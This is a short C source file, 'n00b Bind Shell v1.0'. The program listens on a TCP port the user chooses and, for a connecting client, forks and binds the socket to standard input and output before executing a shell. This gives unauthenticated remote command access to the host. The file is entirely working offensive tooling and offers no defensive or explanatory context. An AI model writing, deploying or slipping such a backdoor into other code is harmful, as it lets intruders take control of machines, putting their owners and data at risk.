/*
 * vim:sw=4 ts=4:et sta
 *
 *
 * Copyright (c) 2015, Fakhri Zulkifli <d0lph1n98@yahoo.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this
 *   list of conditions and the following disclaimer.
 *
 * * Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * * Neither the name of n00bshell nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/types.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#define msg "n00b Bind Shell v1.0\n"

int main(int c, char **v) {
    int tcpfd = 0;
    int connfd = 0;
    struct sockaddr_in serv_addr;

    memset(&serv_addr, 0, sizeof(serv_addr));

    if (c != 3) {
        printf("%s <port> <shell>\n%s 1234 '/bin/sh'\n", v[0], v[0]);
        exit(1);
    }

    if ((tcpfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Can't establish the connection");
        exit(-1);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons((uint16_t) atoi(v[1]));

    if ((bind(tcpfd, (struct sockaddr*) &serv_addr, (socklen_t) sizeof(serv_addr))) < 0) {
        perror("Cannot bind the connection");
        exit(-1);
    }

    if (listen(tcpfd, 10) < 0) {
        perror("Can't listen for connection");
        return -1;
    }

    for (;;) {
        if ((connfd = accept(tcpfd, (struct sockaddr*) NULL, NULL)) < 0) {
            perror("Can't established the connection");
            exit(-1);
        }

        if (!fork()) {
            send(connfd, msg, sizeof(msg), 0);
            dup2(connfd, 0);
            dup2(connfd, 1);
            execl(v[2], v[2], (char *) 0);
            close(connfd);
        }
        close(tcpfd);
        return 0;
    }
}
